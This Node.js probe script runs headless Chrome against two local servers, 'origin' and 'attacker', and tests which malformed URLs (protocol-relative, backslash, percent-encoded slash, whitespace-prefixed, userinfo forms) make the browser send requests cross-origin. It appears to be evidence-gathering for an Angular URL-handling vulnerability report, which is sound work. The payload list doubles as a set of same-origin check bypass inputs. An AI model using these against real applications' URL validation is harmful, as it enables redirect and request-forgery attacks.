import {createServer} from 'node:http';
import {spawn} from 'node:child_process';
import {writeFileSync, mkdirSync, mkdtempSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {fileURLToPath} from 'node:url';
import {dirname, resolve} from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const evidenceDir = resolve(here, '../evidence');
mkdirSync(evidenceDir, {recursive: true});

const chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const profileDir = mkdtempSync(resolve(tmpdir(), 'angular-a12-chrome-profile-'));
const seen = [];

function makeServer(name, handler) {
  return createServer((req, res) => {
    seen.push({server: name, method: req.method, url: req.url, headers: req.headers});
    handler(req, res);
  });
}

const attacker = makeServer('attacker', (_req, res) => {
  res.writeHead(204, {
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'POST, OPTIONS',
    'access-control-allow-headers': '*',
  });
  res.end();
});

const origin = makeServer('origin', (req, res) => {
  if (req.url === '/' || req.url.startsWith('/probe.html')) {
    const originUrl = `http://127.0.0.1:${origin.address().port}`;
    const attackerUrl = `http://127.0.0.1:${attacker.address().port}`;
    const attackerHost = `127.0.0.1:${attacker.address().port}`;
    const cases = [
      ['control-relative', '/sink/control-relative'],
      ['control-absolute-same-origin', `${originUrl}/sink/control-absolute-same-origin`],
      ['control-protocol-relative-attacker', `//${attackerHost}/sink/control-protocol-relative-attacker`],
      ['triple-slash-attacker', `///${attackerHost}/sink/triple-slash-attacker`],
      ['quad-slash-attacker', `////${attackerHost}/sink/quad-slash-attacker`],
      ['leading-backslashes-attacker', `\\\\${attackerHost}\\sink\\leading-backslashes-attacker`],
      ['slash-backslash-attacker', `/\\\\${attackerHost}/sink/slash-backslash-attacker`],
      ['http-four-slash-attacker', `http:////${attackerHost}/sink/http-four-slash-attacker`],
      ['http-slash-backslash-attacker', `http:/\\\\${attackerHost}/sink/http-slash-backslash-attacker`],
      ['http-backslashes-attacker', `http:\\\\${attackerHost}\\sink\\http-backslashes-attacker`],
      ['encoded-double-slash', `/%2f%2f${attackerHost}/sink/encoded-double-slash`],
      ['encoded-backslashes', `/%5c%5c${attackerHost}/sink/encoded-backslashes`],
      ['space-protocol-relative-attacker', `  //${attackerHost}/sink/space-protocol-relative-attacker`],
      ['tab-protocol-relative-attacker', `\t//${attackerHost}/sink/tab-protocol-relative-attacker`],
      ['newline-protocol-relative-attacker', `\n//${attackerHost}/sink/newline-protocol-relative-attacker`],
      ['userinfo-attacker', `http://127.0.0.1@${attackerHost}/sink/userinfo-attacker`],
      ['dotdot-protocol-looking-path', `/safe/..//${attackerHost}/sink/dotdot-protocol-looking-path`],
      ['params-looking-authority', `/sink/params-looking-authority?next=//${attackerHost}/after`],
    ];
    const page = `<!doctype html>
<meta charset="utf-8">
<script>
const cases = ${JSON.stringify(cases)};
const results = [];
async function runFetch(label, url) {
  let computed = null;
  try {
    const parsed = new URL(url, location.origin);
    computed = {href: parsed.href, origin: parsed.origin, sameOrigin: parsed.origin === location.origin};
  } catch (e) {
    computed = {error: String(e), sameOrigin: false};
  }
  try {
    await fetch(url, {
      method: 'POST',
      body: 'body=' + encodeURIComponent(label),
      headers: {'content-type': 'text/plain'},
    });
    results.push({label, url, computed, fetch: 'resolved'});
  } catch (e) {
    results.push({label, url, computed, fetch: 'rejected', error: String(e)});
  }
}
async function main() {
  for (const [label, url] of cases) {
    await runFetch(label, url);
  }
  await fetch('/done', {
    method: 'POST',
    headers: {'content-type': 'application/json'},
    body: JSON.stringify(results),
  });
  document.body.textContent = JSON.stringify(results);
}
main();
</script>`;
    res.writeHead(200, {'content-type': 'text/html; charset=utf-8'});
    res.end(page);
    return;
  }
  if (req.url === '/done') {
    let body = '';
    req.on('data', (chunk) => (body += chunk));
    req.on('end', () => {
      seen.push({server: 'origin-done-body', body});
      res.writeHead(204);
      res.end();
    });
    return;
  }
  res.writeHead(204, {
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'POST, OPTIONS',
    'access-control-allow-headers': '*',
  });
  res.end();
});

attacker.listen(0, '127.0.0.1', () => {
  origin.listen(0, '127.0.0.1', () => {
    const child = spawn(chrome, [
      '--headless=new',
      '--disable-gpu',
      '--no-first-run',
      `--user-data-dir=${profileDir}`,
      '--virtual-time-budget=12000',
      '--dump-dom',
      `http://127.0.0.1:${origin.address().port}/probe.html`,
    ]);

    let stdout = '';
    let stderr = '';
    const timer = setTimeout(() => {
      stderr += '\n[probe] chrome timeout; sending SIGKILL\n';
      child.kill('SIGKILL');
    }, 20000);
    child.stdout.on('data', (chunk) => (stdout += chunk));
    child.stderr.on('data', (chunk) => (stderr += chunk));
    child.on('close', (code) => {
      clearTimeout(timer);
      const result = {code, origin: origin.address().port, attacker: attacker.address().port, seen, stdout, stderr};
      writeFileSync(
        resolve(evidenceDir, '2026-04-29-browser-url-canonicalization-matrix.json'),
        JSON.stringify(result, null, 2),
      );
      console.log(JSON.stringify({code, seen: seen.map(({server, method, url, body}) => ({server, method, url, body}))}, null, 2));
      origin.close();
      attacker.close();
      process.exit(seen.some((entry) => entry.server === 'origin-done-body') ? 0 : (code ?? 1));
    });
  });
});
